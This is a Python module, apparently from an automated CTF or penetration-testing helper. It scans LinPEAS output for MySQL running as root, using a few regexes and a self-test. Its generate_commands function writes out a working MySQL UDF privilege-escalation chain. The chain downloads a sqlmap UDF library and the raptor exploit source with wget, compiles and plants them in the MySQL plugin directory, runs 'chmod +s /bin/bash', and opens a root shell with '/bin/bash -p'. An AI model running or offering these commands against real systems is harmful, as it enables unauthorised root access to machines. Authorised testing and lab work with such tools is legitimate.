"""Detect MySQL running as root for UDF injection from LinPEAS output."""

import re
from typing import Dict, List

# Process line where first token is "root" and line contains mysqld
_PROC_ROOT_RE = re.compile(r"^\s*root\s+\S+\s+.*\bmysqld?\b", re.IGNORECASE)

# mysqld launched with explicit --user=root flag
_USER_ROOT_FLAG_RE = re.compile(r"\bmysqld\b.*--user=root", re.IGNORECASE)

# MySQL credentials section: "User: root" on its own line
_CREDS_USER_RE = re.compile(r"^\s*[Uu]ser\s*:\s*root\s*$")

# MySQL credentials section: "User    root" (tab/space separated)
_CREDS_USER_TAB_RE = re.compile(r"^\s*[Uu]ser\s+root\s*$")


def parse_mysql_section(section_text: str) -> bool:
    """Return True if MySQL is detected running as root in the section text."""
    for line in section_text.splitlines():
        if _PROC_ROOT_RE.search(line):
            return True
        if _USER_ROOT_FLAG_RE.search(line):
            return True
        if _CREDS_USER_RE.match(line):
            return True
        if _CREDS_USER_TAB_RE.match(line):
            return True
    return False


def generate_commands() -> List[str]:
    """Generate MySQL UDF injection exploit steps."""
    return [
        "mysql -u root -e \"select @@version\"",
        "wget https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -O /tmp/udf.so",
        "mysql -u root -e \"use mysql; create table exploit(line blob); insert into exploit values(load_file('/tmp/udf.so')); select * from exploit into dumpfile '/usr/lib/mysql/plugin/udf.so'; create function sys_exec returns integer soname 'udf.so'; select sys_exec('chmod +s /bin/bash');\"",
        "/bin/bash -p",
        "# Alternative (raptor UDF exploit):",
        "wget https://www.exploit-db.com/download/1518 -O /tmp/raptor_udf.c",
        "gcc -g -c /tmp/raptor_udf.c -fPIC -o /tmp/raptor_udf.o",
        "gcc -g -shared -Wl,-soname,raptor.so -o /tmp/raptor.so /tmp/raptor_udf.o -lc",
        "mysql -u root -e \"use mysql; create table foo(line blob); insert into foo values(load_file('/tmp/raptor.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor.so'; create function do_system returns integer soname 'raptor.so'; select do_system('chmod +s /bin/bash');\"",
        "/bin/bash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for MySQL running as root (UDF injection).

    Returns a single HIGH finding when mysqld is detected running as root.
    """
    if not parse_mysql_section(section_text):
        return []
    return [{
        "severity": "HIGH",
        "type": "mysql_udf",
        "commands": generate_commands(),
    }]


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLES = {
        "process line": """
root        987  0.0  0.4  /usr/sbin/mysqld --user=root
ctf        1234  0.0  0.1  /bin/bash
""",
        "credentials section": """
╔══════════╣ MySQL credentials
User: root
Password:
""",
        "not root": """
mysql       500  0.0  0.4  /usr/sbin/mysqld
""",
    }

    for label, text in SAMPLES.items():
        findings = analyze(text)
        print(f"=== {label} ===")
        if findings:
            f = findings[0]
            cmds = f["commands"]
            print(f"[{f['severity']}] {f['type']}  ({len(cmds)} cmd(s))")
            print(f"  TRY FIRST: $ {cmds[0]}")
        else:
            print("  (no finding)")
        print()
